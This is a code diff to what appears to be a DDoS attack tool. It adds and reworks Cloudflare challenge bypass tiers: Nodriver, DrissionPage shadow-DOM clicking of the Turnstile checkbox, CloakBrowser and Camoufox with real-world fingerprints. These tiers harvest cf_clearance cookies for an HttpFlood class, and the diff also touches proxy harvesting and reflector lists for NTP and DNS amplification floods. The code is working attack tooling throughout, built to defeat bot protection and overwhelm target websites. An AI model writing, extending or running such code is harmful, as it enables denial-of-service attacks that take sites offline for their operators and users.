@@ -105,12 +105,6 @@ except ImportError:
     DRISSION_INSTALLED = False
 
 try:
-    from CloudflareBypasser import CloudflareBypasser
-    CFB_INSTALLED = True
-except ImportError:
-    CFB_INSTALLED = False
-
-try:
     import httpx
     HTTPX_INSTALLED = True
 except ImportError:
@@ -127,6 +121,12 @@ try:
     PATCHRIGHT_INSTALLED = True
 except ImportError:
     PATCHRIGHT_INSTALLED = False
+
+try:
+    from cloakbrowser import launch as cloakbrowser_launch
+    CLOAKBROWSER_INSTALLED = True
+except ImportError:
+    CLOAKBROWSER_INSTALLED = False
 
 # --- Windows asyncio Proactor OSError 10057 Workaround ---
 if sys.platform.lower().startswith("win") and sys.version_info >= (3, 8):
@@ -1018,8 +1018,14 @@ class TacticalProxyValidator:
 
         # OS-aware semaphore to avoid select() FD limits on Windows
         is_windows = sys.platform.lower().startswith('win')
-        sem_limit = 500 if is_windows else 2000
+        sem_limit = 128 if is_windows else 1000
         semaphore = asyncio.Semaphore(sem_limit)
+
+        progress = [0]
+        def _log_progress():
+            progress[0] += 1
+            if progress[0] % 100 == 0:
+                logger.info(f"{bcolors.OKBLUE}[*] Resource: Tactical scoring in progress ({progress[0]}/{total_raw})...{bcolors.RESET}")
 
         async def _check(proxy: Proxy) -> Optional[TacticalProxy]:
             async with semaphore:
@@ -1030,6 +1036,7 @@ class TacticalProxyValidator:
                     p = TacticalProxy(proxy, intel['latency'], True)
                     p.score = intel['score']
                     p.fail_count = intel['failures']
+                    _log_progress()
                     return p
                     
                 start_time = time()
@@ -1114,8 +1121,10 @@ class TacticalProxyValidator:
                     tp = TacticalProxy(proxy, latency, True, http_status)
                     tp.http_status = http_status
                     tp.score = tp._calculate_initial_score()
+                    _log_progress()
                     return tp
                 except:
+                    _log_progress()
                     return TacticalProxy(proxy, 30000.0, False, 0)
 
         try:
@@ -1732,7 +1741,7 @@ class BrowserEngine:
         domain = url.split("//")[-1].split("/")[0]
         logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Initializing stealth browser for {url}...{bcolors.RESET}")
         logger.info(f"[*] Solver Config: proxy={'Yes: '+proxy[:30] if proxy else 'None'}, UA={'custom' if user_agent else 'auto'}, timeout={timeout}ms")
-        logger.info(f"[*] Solver Availability: Cloudscraper=Y, curl_cffi={'Y' if CURL_CFFI_INSTALLED else 'N'}, Nodriver={'Y' if NODRIVER_INSTALLED else 'N'}, Camoufox={'Y' if CAMOUFOX_INSTALLED else 'N'}, Patchright={'Y' if PATCHRIGHT_INSTALLED else 'N'}, Playwright={'Y' if PLAYWRIGHT_INSTALLED else 'N'}")
+        logger.info(f"[*] Solver Availability: Cloudscraper=Y, curl_cffi={'Y' if CURL_CFFI_INSTALLED else 'N'}, Nodriver={'Y' if NODRIVER_INSTALLED else 'N'}, Camoufox={'Y' if CAMOUFOX_INSTALLED else 'N'}, Patchright={'Y' if PATCHRIGHT_INSTALLED else 'N'}, Playwright={'Y' if PLAYWRIGHT_INSTALLED else 'N'}, CloakBrowser={'Y' if CLOAKBROWSER_INSTALLED else 'N'}, DrissionPage={'Y' if DRISSION_INSTALLED else 'N'}")
         
         # === TIER 1: Lightweight HTTP Solvers (10s max) ===
         # These can solve simple JS challenges without launching a full browser
@@ -1799,12 +1808,56 @@ class BrowserEngine:
                 if type(e).__name__ in ['ConnectTimeout', 'ProxyError', 'ConnectionError', 'ReadTimeout', 'Timeout', 'SSLError', 'CurlError']:
                     logger.error(f"{bcolors.FAIL}[!] Proxy network failure detected (Tier 1b). Falling through to next tier.{bcolors.RESET}")
                     pass
+
+        # === TIER 1c: Nodriver (Direct CDP Protocol) ===
+        if NODRIVER_INSTALLED:
+            t1c_start = time()
+            logger.info(f"{bcolors.OKCYAN}[*] Tier 1c: Nodriver (native CDP) engine activated.{bcolors.RESET}")
+            try:
+                import nodriver as uc
+                
+                async def _solve_nodriver():
+                    browser = await uc.start()
+                    try:
+                        page = await browser.get(url)
+                        # Built-in Cloudflare verification
+                        if hasattr(page, 'cf_verify'):
+                            await page.cf_verify()
+                        else:
+                            await asyncio.sleep(10)
+                        
+                        # Wait for cf_clearance
+                        cookies = await page.get_cookies()
+                        cookie_str = "; ".join([f"{c.name}={c.value}" for c in cookies])
+                        ua = await page.evaluate("navigator.userAgent")
+                        
+                        if "cf_clearance" in cookie_str:
+                            return cookie_str, ua
+                        return None, None
+                    finally:
+                        browser.stop()
+
+                cookie_str, ua = asyncio.run(_solve_nodriver())
+                t1c_elapsed = round(time() - t1c_start, 2)
+                if cookie_str:
+                    HttpFlood._active_solver = "Nodriver"
+                    logger.info(f"{bcolors.OKGREEN}[*] Tier 1c: Nodriver SUCCESS in {t1c_elapsed}s. cf_clearance obtained.{bcolors.RESET}")
+                    return cookie_str, ua
+                else:
+                    logger.warning(f"{bcolors.WARNING}[!] Tier 1c: Nodriver failed after {t1c_elapsed}s. No cf_clearance. Falling through...{bcolors.RESET}")
+            except Exception as e:
+                t1c_elapsed = round(time() - t1c_start, 2)
+                logger.error(f"{bcolors.FAIL}[!] Tier 1c: Nodriver FAILED in {t1c_elapsed}s: {e}{bcolors.RESET}")
+                logger.debug(f"[!] Nodriver Traceback:\n{traceback.format_exc()}")
+            finally:
+                # Cleanup loop if needed
+                pass
         
         
         # === TIER 2: DrissionPage + CloudflareBypasser ===
-        if DRISSION_INSTALLED and CFB_INSTALLED:
+        if DRISSION_INSTALLED:
             t2a_start = time()
-            logger.info(f"{bcolors.OKCYAN}[*] Tier 2: DrissionPage + CFB engine activated.{bcolors.RESET}")
+            logger.info(f"{bcolors.OKCYAN}[*] Tier 2: DrissionPage engine activated.{bcolors.RESET}")
             try:
                 co = ChromiumOptions()
                 co.auto_port()
@@ -1812,6 +1865,7 @@ class BrowserEngine:
                 co.set_argument('--disable-blink-features=AutomationControlled')
                 if sys.platform != "win32":
                     co.set_argument('--no-sandbox')
+                    co.set_argument('--headless=new')
                 
                 if proxy:
                     px_url = f"http://{proxy}" if "://" not in proxy else proxy
@@ -1846,16 +1900,26 @@ class BrowserEngine:
 
                     # 2. Challenge Identification & Interaction
                     try:
-                        # Improved Turnstile/CF XPath with case-insensitivity handling
-                        cf_frames = page.eles('xpath://iframe[contains(translate(@src, "CF", "cf"), "cloudflare") or contains(@src, "turnstile")]', timeout=0.2)
-                        for frame in cf_frames:
-                            if frame.is_displayed():
-                                # Target the center-left of the widget (likely checkbox position)
-                                rect = frame.rect.location
-                                size = frame.rect.size
-                                page.actions.move(rect[0] + (size[0] * 0.2), rect[1] + (size[1] * 0.5)).click()
-                                logger.debug(f"[*] Headless Recon: Challenge widget interaction pulse {pulse}...")
-                    except: pass
+                        # Shadow DOM Traversal for Turnstile
+                        all_inputs = page.eles("tag:input")
+                        for input_elem in all_inputs:
+                            name = input_elem.attr("name")
+                            if name and "turnstile" in name.lower():
+                                parent = input_elem.parent()
+                                if parent and parent.shadow_root:
+                                    shadow1 = parent.shadow_root
+                                    for child in shadow1.children():
+                                        if child.tag == "iframe":
+                                            iframe_body = child("tag:body")
+                                            if iframe_body and iframe_body.shadow_root:
+                                                shadow2 = iframe_body.shadow_root
+                                                checkbox = shadow2("tag:input")
+                                                if checkbox:
+                                                    checkbox.click()
+                                                    logger.debug(f"[*] Headless Recon: Challenge widget clicked via Shadow DOM.")
+                                                    break
+                    except Exception: 
+                        pass
                     sleep(1.5) # Increased delay for slow SOCKS nodes
 
                 ua = user_agent
@@ -1892,10 +1956,12 @@ class BrowserEngine:
                 camoufox_kwargs = {
                     "headless": not is_windows,  # Turnstile needs visible context on Windows
                     "humanize": True,             # Human-like cursor movements
+                    "fingerprint_preset": True,   # Use real-world fingerprints
                 }
                 if proxy:
                     px_url = f"http://{proxy}" if "://" not in proxy else proxy
                     camoufox_kwargs["proxy"] = {"server": px_url}
+                    camoufox_kwargs["geoip"] = True
                 
                 import warnings
                 with warnings.catch_warnings():
@@ -2008,6 +2074,7 @@ class BrowserEngine:
                 with patchright_sync() as p:
                     launch_args = {
                         "headless": not is_windows,
+                        "channel": "chrome",
                         "args": [
                             "--disable-blink-features=AutomationControlled",
                             "--no-sandbox",
@@ -2071,10 +2138,16 @@ class BrowserEngine:
                         sleep(1.5)
                     
                     # Harvest cookies
-                    cookies_list = context.cookies()
-                    cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies_list])
-                    ua = page.evaluate("navigator.userAgent")
-                    browser.close()
+                    try:
+                        cookies_list = context.cookies()
+                        cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies_list])
+                        ua = page.evaluate("navigator.userAgent")
+                    except Exception:
+                        cookie_str = ""
+                        ua = user_agent
+                    try:
+                        browser.close()
+                    except: pass
                     
                     t2c_elapsed = round(time() - t2c_start, 2)
                     if "cf_clearance" in cookie_str:
@@ -2088,6 +2161,121 @@ class BrowserEngine:
                 logger.error(f"{bcolors.FAIL}[!] Tier 2c: Patchright FAILED in {t2c_elapsed}s: {type(e).__name__}: {e}{bcolors.RESET}")
                 logger.debug(f"[!] Tier 2c Traceback:\n{traceback.format_exc()}")
             finally:
+                try:
+                    if 'asyncio.events' in sys.modules:
+                        sys.modules['asyncio.events']._set_running_loop(None)
+                except Exception:
+                    pass
+
+        # === TIER 2d: CloakBrowser (Advanced Stealth Chromium) ===
+        if CLOAKBROWSER_INSTALLED:
+            t2d_start = time()
+            logger.info(f"{bcolors.OKCYAN}[*] Tier 2d: CloakBrowser (stealth Chromium) engine activated.{bcolors.RESET}")
+            browser = None
+            try:
+                is_windows = sys.platform.lower().startswith('win')
+                
+                cloak_kwargs = {
+                    "headless": not is_windows,
+                    "humanize": True,
+                }
+                
+                if proxy:
+                    px_url = f"http://{proxy}" if "://" not in proxy else proxy
+                    cloak_kwargs["proxy"] = px_url
+                    cloak_kwargs["geoip"] = True
+                    
+                browser = cloakbrowser_launch(**cloak_kwargs)
+                context = browser.contexts[0] if browser.contexts else browser.new_context()
+                page = context.pages[0] if context.pages else context.new_page()
+                
+                try:
+                    page.goto(url, wait_until="domcontentloaded", timeout=20000)
+                except Exception as nav_e:
+                    pass
+                
+                sleep(2)
+                page.mouse.move(randint(100, 800), randint(100, 600), steps=randint(5, 15))
+                sleep(0.5)
+                page.mouse.wheel(0, randint(100, 300))
+                
+                # Turnstile interaction
+                solved = False
+                for attempt in range(12):
+                    for frame in page.frames:
+                        try:
+                            f_url = frame.url.lower()
+                            if any(k in f_url for k in ["cloudflare", "turnstile", "challenge"]):
+                                box = frame.frame_element().bounding_box()
+                                if box:
+                                    tx = box['x'] + (box['width'] * (0.1 + random.random() * 0.2))
+                                    ty = box['y'] + (box['height'] * (0.3 + random.random() * 0.4))
+                                    page.mouse.move(tx, ty, steps=randint(8, 15))
+                                    sleep(0.3 + random.random() * 0.3)
+                                    page.mouse.click(tx, ty)
+                                    solved = True
+                                    break
+                        except Exception:
+                            continue
+                    
+                    if not solved:
+                        for sel in ["input[type='checkbox']", "#challenge-stage", ".ctp-checkbox-container", "[role='checkbox']"]:
+                            try:
+                                if page.locator(sel).count() > 0 and page.locator(sel).is_visible():
+                                    page.locator(sel).click(timeout=2000, delay=randint(50, 150))
+                                    solved = True
+                                    break
+                            except Exception:
+                                pass
+                    
+                    if solved:
+                        page.wait_for_timeout(3000)
+                        try:
+                            title = page.title().lower()
+                            if "just a moment" not in title and title:
+                                break
+                        except Exception:
+                            break
+                        solved = False
+                    
+                    page.mouse.move(randint(100, 800), randint(100, 600), steps=5)
+                    sleep(1.5)
+                
+                # Wait for cf_clearance to appear
+                for _ in range(20):
+                    try:
+                        cookies_list = context.cookies()
+                        if any(c['name'] == 'cf_clearance' for c in cookies_list):
+                            break
+                    except Exception:
+                        break
+                    sleep(1.5)
+                
+                # Harvest cookies
+                cookie_str = ""
+                ua = user_agent
+                try:
+                    cookies_list = context.cookies()
+                    cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies_list])
+                    ua = page.evaluate("navigator.userAgent")
+                except Exception:
+                    pass
+                
+                t2d_elapsed = round(time() - t2d_start, 2)
+                if "cf_clearance" in cookie_str:
+                    HttpFlood._active_solver = "CloakBrowser"
+                    logger.info(f"{bcolors.OKGREEN}[*] Tier 2d: CloakBrowser SUCCESS in {t2d_elapsed}s. cf_clearance obtained.{bcolors.RESET}")
+                    return cookie_str, ua
+                else:
+                    logger.warning(f"{bcolors.WARNING}[!] Tier 2d: CloakBrowser failed after {t2d_elapsed}s. No cf_clearance. Falling through...{bcolors.RESET}")
+            except Exception as e:
+                t2d_elapsed = round(time() - t2d_start, 2)
+                logger.error(f"{bcolors.FAIL}[!] Tier 2d: CloakBrowser FAILED in {t2d_elapsed}s: {type(e).__name__}: {e}{bcolors.RESET}")
+                logger.debug(f"[!] Tier 2d Traceback:\n{traceback.format_exc()}")
+            finally:
+                try:
+                    if browser: browser.close()
+                except: pass
                 try:
                     if 'asyncio.events' in sys.modules:
                         sys.modules['asyncio.events']._set_running_loop(None)
@@ -2225,9 +2413,13 @@ class BrowserEngine:
 
                 logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Waiting for bypass validation...{bcolors.RESET}")
                 for i in range(40):
-                    cookies_list = context.cookies()
-                    if any(c['name'] == 'cf_clearance' for c in cookies_list):
-                        logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Cloudflare Clearance Obtained!{bcolors.RESET}")
+                    try:
+                        cookies_list = context.cookies()
+                        if any(c['name'] == 'cf_clearance' for c in cookies_list):
+                            logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Cloudflare Clearance Obtained!{bcolors.RESET}")
+                            break
+                    except Exception as e:
+                        logger.debug(f"[*] Headless Recon: Failed to get cookies during validation: {e}")
                         break
                     
                     try: 
@@ -2251,11 +2443,16 @@ class BrowserEngine:
                     final_title = str(final_title).encode('ascii', 'ignore').decode('ascii')
                 except: pass
                 
-                cookies_list = context.cookies()
-                cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies_list])
-                ua = page.evaluate("navigator.userAgent")
-                
-                logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Protocol finished. Page Title: {final_title} | Cookies length: {len(cookies_list)}{bcolors.RESET}")
+                try:
+                    cookies_list = context.cookies()
+                    cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies_list])
+                    ua = page.evaluate("navigator.userAgent")
+                    logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Protocol finished. Page Title: {final_title} | Cookies length: {len(cookies_list)}{bcolors.RESET}")
+                except Exception as e:
+                    logger.debug(f"[*] Headless Recon: Failed to extract final cookies/ua: {e}")
+                    cookie_str = ""
+                    ua = user_agent
+                    logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Protocol finished with exception. Page Title: {final_title}{bcolors.RESET}")
                 
                 if "cf_clearance" not in cookie_str:
                     logger.warning(f"{bcolors.WARNING}[!] Headless Recon: Failed to obtain cf_clearance in Playwright fallback.{bcolors.RESET}")
@@ -2910,9 +3107,9 @@ class HttpFlood:
             host,
             proxy_pool,
         )
-        self._raw_target = (self._host, (self._target.port or 80))
+        self._raw_target = (self._host, (self._target.port or (443 if self._target.scheme == "https" else 80)))
         if not self._target.host[len(self._target.host) - 1].isdigit():
-            self._raw_target = (self._host, (self._target.port or 80))
+            self._raw_target = (self._host, (self._target.port or (443 if self._target.scheme == "https" else 80)))
         self.methods = {
             "POST": self.POST,
             "CFB": self.CFB,
@@ -4742,10 +4939,10 @@ def handleProxyList(con, proxy_arg, proxy_ty, url=None):
     else:
         proxy_li = Path(proxy_arg)
         is_sentinel = "ReloadSentinel" in current_thread().name
-        force_harvest = proxy_li.name == "auto_harvest.txt"
-        
+        force_harvest = proxy_li.name.lower() in ("auto_harvest.txt", "auto")
+
         if not proxy_li.exists() or force_harvest:
-            if proxy_li.name == "auto_harvest.txt":
+            if proxy_li.name.lower() in ("auto_harvest.txt", "auto"):
                 action_type = "Refreshing" if is_sentinel else "Scraping"
                 logger.info(f"{bcolors.OKCYAN}[*] Auto-Harvest: {action_type} global tactical matrices. Please stand by...{bcolors.RESET}")
             else:
@@ -4794,7 +4991,11 @@ async def main_async():
         event.clear()
         urlraw = argv[2].strip()
         if not urlraw.startswith("http"):
-            urlraw = "http://" + urlraw
+            # Cloudflare-specific methods should default to HTTPS
+            if any(cf_m in one.upper() for cf_m in ["CFB", "CFBUAM", "BEHAVIOR", "BROWSER"]):
+                urlraw = "https://" + urlraw
+            else:
+                urlraw = "http://" + urlraw
         if method not in Methods.ALL_METHODS:
             exit("Method Not Found %s" % ", ".join(Methods.ALL_METHODS))
 
@@ -4905,11 +5106,18 @@ async def main_async():
                 except Exception as e:
                     logger.debug(f"[!] Intelligence load error: {e}")
 
-            proxy_li = (
-                proxy_arg
-                if proxy_arg.startswith("http")
-                else get_assets_path() / "proxies" / proxy_arg
-            )
+            def resolve_proxy_path(arg):
+                if arg.startswith("http"): return arg
+                # 1. Check Assets (User)
+                p_assets = get_assets_path() / "proxies" / arg
+                if p_assets.exists(): return p_assets
+                # 2. Check Resource (System)
+                p_res = get_project_root() / "resource" / "files" / "proxies" / arg
+                if p_res.exists(): return p_res
+                # Default to assets path for creation (harvest)
+                return p_assets
+
+            proxy_li = resolve_proxy_path(proxy_arg)
             useragent_li, referers_li, bombardier_path = (
                 get_assets_path() / "useragent.txt",
                 get_assets_path() / "referers.txt",
@@ -5020,7 +5228,17 @@ async def main_async():
             if len(argv) >= 6:
                 argfive = argv[5].strip()
                 if argfive and not argfive.startswith("--"):
-                    refl_li = Path(__dir__ / "files" / argfive)
+                    def resolve_reflector_path(arg):
+                        # 1. Check reflectors folder (System)
+                        p_refl = get_project_root() / "resource" / "files" / "reflectors" / arg
+                        if p_refl.exists(): return p_refl
+                        # 2. Check files folder (Legacy/Root)
+                        p_root = get_project_root() / "resource" / "files" / arg
+                        if p_root.exists(): return p_root
+                        # Default to reflectors folder
+                        return p_refl
+
+                    refl_li = resolve_reflector_path(argfive)
                     if method in {
                         "NTP",
                         "DNS",
